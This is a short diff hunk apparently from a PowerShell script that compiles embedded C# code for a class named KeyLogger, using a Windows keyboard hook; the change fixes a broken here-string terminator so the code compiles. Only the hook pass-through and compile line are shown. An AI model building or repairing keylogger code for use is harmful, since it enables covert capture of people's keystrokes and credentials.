@@ -65,7 +65,7 @@ public class KeyLogger {
         return CallNextHookEx(hookID, nCode, wParam, lParam);
     }
 }
-"@"
+@"
 
 # Compile the C# code and load it into PowerShell
 Add-Type -TypeDefinition $signature -Language CSharp
